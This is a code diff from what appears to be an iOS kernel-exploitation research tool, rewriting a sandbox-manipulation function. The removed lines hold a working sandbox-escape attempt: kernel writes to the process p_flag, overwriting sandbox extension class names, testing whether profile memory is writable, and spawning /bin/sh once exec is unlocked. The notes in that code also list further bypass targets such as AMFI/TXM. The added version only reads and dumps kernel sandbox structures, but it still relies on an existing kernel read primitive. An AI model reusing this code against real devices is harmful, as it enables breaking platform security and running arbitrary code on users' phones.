@@ -458,334 +458,198 @@ char *kresearch_dump_sandbox_profile(void) {
 
 char *kresearch_swap_sandbox_profile(void) {
     buf_init();
-    buf_append("=== SANDBOX PROFILE SWAP v5 ===\n");
-    buf_append("(v4 crashed: NULLing profile caused kernel panic\n");
-    buf_append(" because concurrent threads hit sandbox_check with NULL ptr.\n");
-    buf_append(" v5: NO profile NULLing. Extension class swap + diagnostics.)\n\n");
+    buf_append("=== SANDBOX DIAGNOSTIC v6 (READ-ONLY) ===\n");
+    buf_append("(v5 crashed. v6 does ZERO kernel writes — pure diagnostics.)\n\n");
 
-    // ── Step 1: Get proc_self() ──
+    // ── Step 1: proc_self ──
     fprintf(stderr, "[SWAP] Step 1: proc_self()\n");
     uint64_t self_proc = proc_self();
     if (!self_proc || !is_kaddr_valid(self_proc)) {
-        buf_append("ERROR: proc_self() returned invalid: 0x%llx\n", self_proc);
+        buf_append("ERROR: proc_self() invalid: 0x%llx\n", self_proc);
         return buf_finish();
     }
-    buf_append("proc_self() = 0x%llx\n", self_proc);
 
-    // ── Step 2: Read proc fields ──
-    fprintf(stderr, "[SWAP] Step 2: read p_pid, p_name\n");
     pid_t our_pid = (pid_t)kread32(self_proc + off_proc_p_pid);
     char p_name[32] = {0};
     kreadbuf(self_proc + off_proc_p_name, p_name, 31);
-    buf_append("PID=%d name=%s\n", our_pid, p_name);
+    buf_append("PID=%d name=%s proc=0x%llx\n", our_pid, p_name, self_proc);
 
-    // ── Step 3: proc_ro → ucred → label → sandbox ──
-    fprintf(stderr, "[SWAP] Step 3-6: chain walk\n");
+    // ── Step 2: Chain walk (all reads) ──
+    fprintf(stderr, "[SWAP] Step 2: chain walk\n");
     uint64_t proc_ro = kread_ptr(self_proc + off_proc_p_proc_ro);
     if (!proc_ro || !is_kaddr_valid(proc_ro)) {
-        buf_append("ERROR: proc_ro invalid: 0x%llx\n", proc_ro);
+        buf_append("ERROR: proc_ro invalid\n");
         return buf_finish();
     }
     uint64_t ucred = kread_ptr(proc_ro + off_proc_ro_p_ucred);
     if (!ucred || !is_kaddr_valid(ucred)) {
-        buf_append("ERROR: ucred invalid: 0x%llx\n", ucred);
+        buf_append("ERROR: ucred invalid\n");
         return buf_finish();
     }
     uint64_t label = kread_ptr(ucred + off_ucred_cr_label);
     if (!label || !is_kaddr_valid(label)) {
-        buf_append("ERROR: cr_label invalid: 0x%llx\n", label);
+        buf_append("ERROR: label invalid\n");
         return buf_finish();
     }
     uint64_t sandbox = kread_ptr(label + off_label_l_perpolicy_sandbox);
     if (!sandbox || sandbox == 0xFFFFFFFFFFFFFFFFULL || !is_kaddr_valid(sandbox)) {
-        buf_append("ERROR: sandbox invalid: 0x%llx\n", sandbox);
+        buf_append("ERROR: sandbox invalid (0x%llx)\n", sandbox);
         return buf_finish();
     }
     buf_append("proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx\n",
                proc_ro, ucred, label, sandbox);
 
-    // ── Step 7: sandbox_label fields ──
-    fprintf(stderr, "[SWAP] Step 7: sandbox_label fields\n");
-    uint64_t orig_profile = kread_ptr(sandbox + 0x00);
+    // ── Step 3: sandbox_label raw dump ──
+    fprintf(stderr, "[SWAP] Step 3: sandbox_label dump\n");
+    uint64_t profile = kread_ptr(sandbox + 0x00);
+    uint64_t sb_08   = kread64(sandbox + 0x08);
     uint64_t ext_set = kread_ptr(sandbox + 0x10);
-    buf_append("  profile=0x%llx  ext_set=0x%llx\n", orig_profile, ext_set);
+    uint64_t sb_18   = kread64(sandbox + 0x18);
+    buf_append("\nsandbox_label at 0x%llx:\n", sandbox);
+    buf_append("  +0x00 profile  = 0x%llx\n", profile);
+    buf_append("  +0x08 unk      = 0x%llx\n", sb_08);
+    buf_append("  +0x10 ext_set  = 0x%llx\n", ext_set);
+    buf_append("  +0x18 unk      = 0x%llx\n", sb_18);
 
-    // ── Step 8: Baseline ──
-    fprintf(stderr, "[SWAP] Step 8: baseline\n");
-    int exec_before = sandbox_check(our_pid, "process-exec",
-                                     SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
-    int fork_before = sandbox_check(our_pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
-    buf_append("BEFORE: exec=%s  fork=%s\n",
-               exec_before == 0 ? "ALLOWED" : "BLOCKED",
-               fork_before == 0 ? "ALLOWED" : "BLOCKED");
+    // ── Step 4: p_flag ──
+    fprintf(stderr, "[SWAP] Step 4: p_flag\n");
+    uint32_t pflags = kread32(self_proc + off_proc_p_flag);
+    buf_append("\np_flag = 0x%08x\n", pflags);
+    buf_append("  P_LP64       (0x004): %s\n", (pflags & 0x004) ? "YES" : "no");
+    buf_append("  P_PLATFORM   (0x400): %s\n", (pflags & 0x400) ? "YES" : "no");
+    buf_append("  bit 0x4000          : %s\n", (pflags & 0x4000) ? "YES" : "no");
+    buf_append("  bit 0x04000000      : %s\n", (pflags & 0x04000000) ? "YES" : "no");
 
-    bool exec_unlocked = (exec_before == 0);
-    uint32_t orig_pflags = kread32(self_proc + off_proc_p_flag);
-    buf_append("p_flag = 0x%08x\n\n", orig_pflags);
+    // ── Step 5: sandbox_check for various operations ──
+    fprintf(stderr, "[SWAP] Step 5: sandbox_check\n");
+    buf_append("\nsandbox_check results:\n");
 
-    // ═══════════════════════════════════════════════════════════
-    // APPROACH A: p_flag — set P_PLATFORM (0x400), clear 0x04000000
-    // proc struct is WRITABLE. Safe — no concurrent crash risk.
-    // ═══════════════════════════════════════════════════════════
-    if (!exec_unlocked) {
-        fprintf(stderr, "[SWAP] Approach A: p_flag\n");
-        buf_append("-- Approach A: p_flag modification --\n");
+    int r;
+    r = sandbox_check(our_pid, "process-exec",
+                       SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+    buf_append("  process-exec /bin/sh  : %s (%d)\n", r==0?"ALLOWED":"BLOCKED", r);
 
-        uint32_t new_pf = (orig_pflags | 0x400) & ~0x04000000;
-        kwrite32(self_proc + off_proc_p_flag, new_pf);
-        uint32_t rb32 = kread32(self_proc + off_proc_p_flag);
-        buf_append("  Wrote: 0x%08x  Readback: 0x%08x\n", new_pf, rb32);
+    r = sandbox_check(our_pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
+    buf_append("  process-fork          : %s (%d)\n", r==0?"ALLOWED":"BLOCKED", r);
 
-        int exec_check = sandbox_check(our_pid, "process-exec",
-                          SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
-        int fork_check = sandbox_check(our_pid, "process-fork", SANDBOX_CHECK_NO_REPORT);
-        buf_append("  AFTER: exec=%s  fork=%s\n",
-                   exec_check == 0 ? "ALLOWED" : "BLOCKED",
-                   fork_check == 0 ? "ALLOWED" : "BLOCKED");
+    r = sandbox_check(our_pid, "process-exec*",
+                       SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+    buf_append("  process-exec* /bin/sh : %s (%d)\n", r==0?"ALLOWED":"BLOCKED", r);
 
-        if (exec_check == 0) {
-            buf_append("  *** EXEC UNLOCKED via p_flag! ***\n");
-            exec_unlocked = true;
-        } else {
-            kwrite32(self_proc + off_proc_p_flag, orig_pflags);
-            buf_append("  No effect. Restored.\n");
-        }
-    }
+    r = sandbox_check(our_pid, "file-read-data",
+                       SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
+    buf_append("  file-read-data /bin/sh: %s (%d)\n", r==0?"ALLOWED":"BLOCKED", r);
 
-    // ═══════════════════════════════════════════════════════════
-    // APPROACH B: Extension class experiment
-    //
-    // sandbox_escape.m verified node layout (different from sandbox_research.h!):
-    //   extension_class_node: +0x00=next, +0x08=ext_list_head, +0x10=class_name
-    //   extension:            +0x40=data_ptr, +0x48=data_len
-    //
-    // sandbox_escape stored class name strings at data_ptr+32.
-    // We read bucket[0]'s class, then try swapping it to exec classes.
-    // Only bucket 0 is changed — other buckets keep filesystem access.
-    // ═══════════════════════════════════════════════════════════
-    if (!exec_unlocked && ext_set && is_kaddr_valid(ext_set)) {
-        fprintf(stderr, "[SWAP] Approach B: extension class experiment\n");
-        buf_append("\n-- Approach B: Extension class experiment --\n");
+    r = sandbox_check(our_pid, "file-write-data",
+                       SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/var/mobile/test");
+    buf_append("  file-write-data       : %s (%d)\n", r==0?"ALLOWED":"BLOCKED", r);
 
-        // Corrected offsets from sandbox_escape.m
-        #define NODE_NEXT          0x00
-        #define NODE_EXT_LIST_HEAD 0x08
-        #define NODE_CLASS_NAME    0x10
-        #define EXT_DATA_PTR       0x40
-        #define EXT_DATA_LEN       0x48
+    r = sandbox_check(our_pid, "mach-lookup",
+                       SANDBOX_FILTER_GLOBAL_NAME | SANDBOX_CHECK_NO_REPORT,
+                       "com.apple.springboard");
+    buf_append("  mach-lookup SB        : %s (%d)\n", r==0?"ALLOWED":"BLOCKED", r);
 
-        // Dump all buckets with corrected offsets first
-        buf_append("  Extension buckets (corrected offsets):\n");
+    // ── Step 6: Extension buckets (corrected offsets from sandbox_escape.m) ──
+    fprintf(stderr, "[SWAP] Step 6: extension buckets\n");
+    buf_append("\nExtension set at 0x%llx:\n", ext_set);
+    buf_append("(Corrected: node+0x00=next, +0x08=ext_list, +0x10=class_name)\n");
+    buf_append("(Extension: +0x40=data_ptr, +0x48=data_len)\n\n");
+
+    if (ext_set && is_kaddr_valid(ext_set)) {
         for (int i = 0; i < 9; i++) {
             uint64_t node = kread_ptr(ext_set + (i * 8));
             if (!node || !is_kaddr_valid(node)) {
-                buf_append("    [%d] empty\n", i);
+                buf_append("  [%d] (empty)\n", i);
                 continue;
             }
-            uint64_t cls_ptr = kread_ptr(node + NODE_CLASS_NAME);
+
+            uint64_t node_next = kread64(node + 0x00);
+            uint64_t ext_head  = kread_ptr(node + 0x08);
+            uint64_t cls_ptr   = kread_ptr(node + 0x10);
+            uint64_t count_val = kread64(node + 0x18);
+
             char cls[64] = {0};
             if (cls_ptr && is_kaddr_valid(cls_ptr))
                 kreadbuf(cls_ptr, cls, 63);
-            uint64_t ext_head = kread_ptr(node + NODE_EXT_LIST_HEAD);
-            buf_append("    [%d] node=0x%llx class=\"%s\" ext_head=0x%llx\n",
-                       i, node, cls, ext_head);
-        }
 
-        // Find a bucket with a valid extension we can experiment on.
-        // Use bucket 0 (unique node address, won't affect others).
-        uint64_t test_node = kread_ptr(ext_set + 0);
-        if (test_node && is_kaddr_valid(test_node)) {
-            uint64_t cls_ptr = kread_ptr(test_node + NODE_CLASS_NAME);
-            uint64_t ext_head = kread_ptr(test_node + NODE_EXT_LIST_HEAD);
+            buf_append("  [%d] node=0x%llx next=0x%llx\n", i, node, node_next);
+            buf_append("      ext_head=0x%llx class_ptr=0x%llx count=%llu\n",
+                       ext_head, cls_ptr, (unsigned long long)count_val);
+            buf_append("      class=\"%s\"\n", cls);
 
-            buf_append("\n  Using bucket[0] node=0x%llx\n", test_node);
-            buf_append("  class_name ptr=0x%llx  ext_head=0x%llx\n", cls_ptr, ext_head);
+            // Walk first 3 extensions in this bucket
+            uint64_t ext = ext_head;
+            for (int j = 0; j < 3 && ext && is_kaddr_valid(ext); j++) {
+                uint64_t e_next = kread64(ext + 0x00);
+                uint64_t e_data = kread64(ext + 0x40);
+                uint64_t e_dlen = kread64(ext + 0x48);
 
-            // Save original class name
-            char orig_cls[64] = {0};
-            if (cls_ptr && is_kaddr_valid(cls_ptr)) {
-                kreadbuf(cls_ptr, orig_cls, 63);
-                buf_append("  Original class: \"%s\"\n", orig_cls);
+                char path[64] = {0};
+                if (e_data && is_kaddr_valid(e_data))
+                    kreadbuf(e_data, path, 63);
+
+                buf_append("      ext[%d] addr=0x%llx data=0x%llx len=%llu path=\"%s\"\n",
+                           j, ext, e_data, (unsigned long long)e_dlen, path);
+
+                // Also dump ext+0x50 (set to 0xFFFF...FFFF by sandbox_escape)
+                uint64_t e_50 = kread64(ext + 0x50);
+                buf_append("             +0x50=0x%llx\n", e_50);
+
+                ext = kread_ptr(e_next);
             }
-
-            // Get the extension's data_ptr (where class name string is stored)
-            uint64_t data_ptr = 0;
-            if (ext_head && is_kaddr_valid(ext_head)) {
-                data_ptr = kread64(ext_head + EXT_DATA_PTR);
-                buf_append("  ext data_ptr=0x%llx\n", data_ptr);
-            }
-
-            // Where the class name string lives: data_ptr + 32
-            // (sandbox_escape.m writes class name to da+32)
-            uint64_t cls_str_addr = 0;
-            if (cls_ptr && is_kaddr_valid(cls_ptr)) {
-                cls_str_addr = cls_ptr;  // Use whatever set_rw_class pointed to
-            }
-
-            if (cls_str_addr && is_kaddr_valid(cls_str_addr)) {
-                // Try each candidate exec extension class name
-                const char *exec_classes[] = {
-                    "com.apple.sandbox.process-exec",
-                    "com.apple.sandbox.executable",
-                    "com.apple.app-sandbox.process-exec",
-                    "process-exec",
-                    NULL
-                };
-
-                for (int c = 0; exec_classes[c] && !exec_unlocked; c++) {
-                    fprintf(stderr, "[SWAP] B: trying class \"%s\"\n", exec_classes[c]);
-                    buf_append("\n  Trying class: \"%s\"\n", exec_classes[c]);
-
-                    // Write new class name (max 32 bytes via kwrite_zone_element)
-                    uint8_t cls_buf[32];
-                    memset(cls_buf, 0, 32);
-                    size_t len = strlen(exec_classes[c]);
-                    if (len > 31) len = 31;
-                    memcpy(cls_buf, exec_classes[c], len);
-                    kwrite_zone_element(cls_str_addr, cls_buf, 32);
-
-                    // Verify write
-                    char readback[64] = {0};
-                    kreadbuf(cls_str_addr, readback, 63);
-                    buf_append("  Wrote, readback=\"%s\"\n", readback);
-
-                    // Test sandbox_check
-                    int exec_check = sandbox_check(our_pid, "process-exec",
-                                      SANDBOX_FILTER_PATH | SANDBOX_CHECK_NO_REPORT, "/bin/sh");
-                    int fork_check = sandbox_check(our_pid, "process-fork",
-                                      SANDBOX_CHECK_NO_REPORT);
-                    buf_append("  Result: exec=%s  fork=%s\n",
-                               exec_check == 0 ? "ALLOWED" : "BLOCKED",
-                               fork_check == 0 ? "ALLOWED" : "BLOCKED");
-
-                    if (exec_check == 0) {
-                        buf_append("  *** EXEC UNLOCKED with class \"%s\"! ***\n",
-                                   exec_classes[c]);
-                        exec_unlocked = true;
-                    }
-                }
-
-                // Restore original class name
-                if (!exec_unlocked) {
-                    uint8_t restore_buf[32];
-                    memset(restore_buf, 0, 32);
-                    size_t rlen = strlen(orig_cls);
-                    if (rlen > 31) rlen = 31;
-                    memcpy(restore_buf, orig_cls, rlen);
-                    kwrite_zone_element(cls_str_addr, restore_buf, 32);
-                    buf_append("\n  None worked. Class restored to \"%s\".\n", orig_cls);
-                }
-            } else {
-                buf_append("  No valid class_name string address to patch.\n");
-            }
-        } else {
-            buf_append("  Bucket[0] empty/invalid.\n");
         }
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // APPROACH C: Profile bytecode probe (READ-ONLY)
-    // Dump first 64 bytes of the sandbox profile to understand format.
-    // This is purely diagnostic — no writes.
-    // ═══════════════════════════════════════════════════════════
-    if (!exec_unlocked && orig_profile && is_kaddr_valid(orig_profile)) {
-        fprintf(stderr, "[SWAP] Approach C: profile bytecode probe\n");
-        buf_append("\n-- Approach C: Profile bytecode probe (read-only) --\n");
-        buf_append("  Profile at 0x%llx:\n", orig_profile);
-
-        uint8_t prof_bytes[64];
-        kreadbuf(orig_profile, prof_bytes, 64);
-        for (int row = 0; row < 4; row++) {
+    // ── Step 7: Profile bytecode dump (READ-ONLY) ──
+    fprintf(stderr, "[SWAP] Step 7: profile bytecode\n");
+    if (profile && is_kaddr_valid(profile)) {
+        buf_append("\nProfile bytecode at 0x%llx (first 128 bytes):\n", profile);
+        uint8_t prof[128];
+        kreadbuf(profile, prof, 128);
+        for (int row = 0; row < 8; row++) {
             buf_append("  %04x:", row * 16);
             for (int col = 0; col < 16; col++)
-                buf_append(" %02x", prof_bytes[row * 16 + col]);
+                buf_append(" %02x", prof[row * 16 + col]);
             buf_append("  ");
             for (int col = 0; col < 16; col++) {
-                uint8_t ch = prof_bytes[row * 16 + col];
+                uint8_t ch = prof[row * 16 + col];
                 buf_append("%c", (ch >= 0x20 && ch < 0x7f) ? ch : '.');
             }
             buf_append("\n");
         }
-
-        // Check if profile memory is writable (write-back same value)
-        uint64_t prof_word0 = kread64(orig_profile);
-        kwrite64(orig_profile, prof_word0);
-        uint64_t prof_rb = kread64(orig_profile);
-        buf_append("  Profile writable: %s (wrote 0x%llx, read 0x%llx)\n",
-                   (prof_rb == prof_word0) ? "YES" : "NO", prof_word0, prof_rb);
     }
 
-    // ═══════════════════════════════════════════════════════════
-    // APPROACH D: Check launchd for reference
-    // ═══════════════════════════════════════════════════════════
-    if (!exec_unlocked) {
-        fprintf(stderr, "[SWAP] Approach D: launchd check\n");
-        buf_append("\n-- Approach D: Launchd sandbox info --\n");
+    // ── Step 8: Launchd comparison ──
+    fprintf(stderr, "[SWAP] Step 8: launchd\n");
+    buf_append("\nLaunchd (PID 1) comparison:\n");
+    uint64_t ld_proc = proc_find(1);
+    if (ld_proc && is_kaddr_valid(ld_proc)) {
+        uint32_t ld_pf = kread32(ld_proc + off_proc_p_flag);
+        buf_append("  p_flag = 0x%08x\n", ld_pf);
 
-        uint64_t launchd_proc = proc_find(1);
-        if (launchd_proc && is_kaddr_valid(launchd_proc)) {
-            uint64_t ld_proc_ro = kread_ptr(launchd_proc + off_proc_p_proc_ro);
-            uint64_t ld_ucred = (ld_proc_ro && is_kaddr_valid(ld_proc_ro))
-                ? kread_ptr(ld_proc_ro + off_proc_ro_p_ucred) : 0;
-            uint64_t ld_label = (ld_ucred && is_kaddr_valid(ld_ucred))
-                ? kread_ptr(ld_ucred + off_ucred_cr_label) : 0;
-            uint64_t ld_sandbox = (ld_label && is_kaddr_valid(ld_label))
-                ? kread_ptr(ld_label + off_label_l_perpolicy_sandbox) : 0;
+        uint64_t ld_pro = kread_ptr(ld_proc + off_proc_p_proc_ro);
+        uint64_t ld_uc  = (ld_pro && is_kaddr_valid(ld_pro))
+            ? kread_ptr(ld_pro + off_proc_ro_p_ucred) : 0;
+        uint64_t ld_lab = (ld_uc && is_kaddr_valid(ld_uc))
+            ? kread_ptr(ld_uc + off_ucred_cr_label) : 0;
+        uint64_t ld_sb  = (ld_lab && is_kaddr_valid(ld_lab))
+            ? kread_ptr(ld_lab + off_label_l_perpolicy_sandbox) : 0;
 
-            buf_append("  launchd sandbox = 0x%llx", ld_sandbox);
-            if (ld_sandbox == 0xFFFFFFFFFFFFFFFFULL)
-                buf_append(" (sentinel = unsandboxed)");
-            buf_append("\n");
+        buf_append("  sandbox = 0x%llx", ld_sb);
+        if (ld_sb == 0xFFFFFFFFFFFFFFFFULL)
+            buf_append(" (sentinel=unsandboxed)");
+        buf_append("\n");
 
-            // Also check launchd's p_flag for comparison
-            uint32_t ld_pflags = kread32(launchd_proc + off_proc_p_flag);
-            buf_append("  launchd p_flag = 0x%08x\n", ld_pflags);
-        } else {
-            buf_append("  proc_find(1) failed.\n");
-        }
-    }
-
-    // ═══════════════════════════════════════════════════════════
-    // TRY POSIX_SPAWN if any approach unlocked exec
-    // ═══════════════════════════════════════════════════════════
-    if (exec_unlocked) {
-        fprintf(stderr, "[SWAP] Testing posix_spawn\n");
-        buf_append("\n-- Testing posix_spawn --\n");
-
-        pid_t child = 0;
-        char *argv[] = {"/bin/sh", "-c", "echo spawn_ok && id", NULL};
-        char *envp[] = {"PATH=/usr/bin:/bin:/usr/sbin:/sbin", NULL};
-        int ret = posix_spawn(&child, "/bin/sh", NULL, NULL, argv, envp);
-
-        if (ret == 0) {
-            buf_append("*** posix_spawn SUCCEEDED! *** PID=%d\n", child);
-            int status = 0;
-            waitpid(child, &status, 0);
-            buf_append("Exit: %d\n", WIFEXITED(status) ? WEXITSTATUS(status) : -1);
-        } else {
-            buf_append("posix_spawn: %d (%s)\n", ret, strerror(ret));
+        // If launchd has a real sandbox_label, dump its profile ptr
+        if (ld_sb && ld_sb != 0xFFFFFFFFFFFFFFFFULL && is_kaddr_valid(ld_sb)) {
+            uint64_t ld_profile = kread_ptr(ld_sb + 0x00);
+            buf_append("  profile = 0x%llx\n", ld_profile);
         }
     } else {
-        buf_append("\n-- All approaches exhausted --\n");
-        buf_append("Findings:\n");
-        buf_append("  - NULLing profile crashes (concurrent sandbox_check deref)\n");
-        buf_append("  - p_flag P_PLATFORM doesn't affect sandbox_check\n");
-        buf_append("  - Extension class swap results above\n");
-        buf_append("  - Profile bytecode dump above for analysis\n");
-        buf_append("\nRemaining vectors:\n");
-        buf_append("  1. Patch profile bytecode (if writable)\n");
-        buf_append("  2. Patch sandbox kext MAC hook table\n");
-        buf_append("  3. AMFI/TXM bypass\n");
+        buf_append("  proc_find(1) failed\n");
     }
 
-    // ── Safety restore ──
-    fprintf(stderr, "[SWAP] Final restore\n");
-    uint32_t cur_pflags = kread32(self_proc + off_proc_p_flag);
-    if (cur_pflags != orig_pflags) {
-        kwrite32(self_proc + off_proc_p_flag, orig_pflags);
-    }
-    buf_append("\nState restored.\n");
-
+    buf_append("\n=== END DIAGNOSTIC (no kernel writes performed) ===\n");
     return buf_finish();
 }
 
